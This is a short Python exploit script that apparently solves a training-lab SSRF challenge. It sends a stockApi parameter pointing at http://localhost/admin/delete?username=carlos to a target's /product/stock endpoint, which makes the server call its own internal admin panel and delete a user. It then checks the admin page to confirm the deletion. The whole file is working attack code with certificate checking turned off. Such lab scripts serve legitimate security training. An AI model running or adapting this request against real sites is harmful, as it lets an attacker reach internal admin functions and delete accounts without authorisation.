import requests
import sys
import urllib3
import click
import colorama
from colorama import init, Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def exploit(url):
    #Exploiting the target
    exploit_parameter = {'stockApi':'http://localhost/admin/delete?username=carlos'}
    stock_path = '/product/stock'
    exploit_request = requests.post(url+stock_path,data=exploit_parameter,verify=False)
    
    #Checking if the user got deleted
    check_parameter = {'stockApi':'http://localhost/admin'}
    check_request = requests.post(url+stock_path,data=check_parameter,verify=False)
    
    if 'User deleted successfully!' in check_request.text:
        print(Fore.GREEN+"[+] The user Carlos has successfully been deleted, and the lab has been solved!")
    else:
        print(Fore.RED+"[-] The unforunate happened :((")
    

@click.command()
@click.option('-u','--url',type=str,prompt="The URL of the target", required=True,help="The URL of the vulnerable target")
def main(url):
    print(Fore.YELLOW+"[*] Deleting the user Carlos")
    exploit(url)
    

if __name__=="__main__":
        main()